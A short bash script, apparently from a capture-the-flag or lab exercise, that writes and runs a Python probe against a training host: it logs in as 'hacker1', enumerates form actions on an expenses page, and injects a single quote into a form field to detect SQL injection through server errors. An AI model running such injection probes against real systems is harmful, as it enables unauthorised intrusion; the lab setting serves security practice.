#!/bin/bash
cat > /tmp/o752b.py <<'EOF'
import re, requests, time, sys
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:17222"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.post(A + "/login", data={"username": "hacker1", "password": "pass1234"}, timeout=20, allow_redirects=True)
r = s.get(A + "/expenses", timeout=20)
# toutes les actions/liens du tableau
print("=== actions du tableau ===")
for m in re.findall(r'action="([^"]+)"|href="(/(?:expenses|edit|delete|report)[^"]*)"', r.text):
    print(" ", m)
print()
# test quote dans chaque champ
for field, val in (("description", "a'"), ("amount", "1"), ("date", "2024-01-01")):
    d = {"description": "TESTX", "amount": "5", "date": "2024-02-02"}
    d[field] = val
    r = s.post(A + "/expenses", data=d, timeout=20, allow_redirects=False)
    print("%s=%r -> HTTP %d" % (field, val, r.status_code))
    if r.status_code >= 500:
        print("   ERR:", r.text[:200].replace("\n", " "))
EOF
python3 /tmp/o752b.py
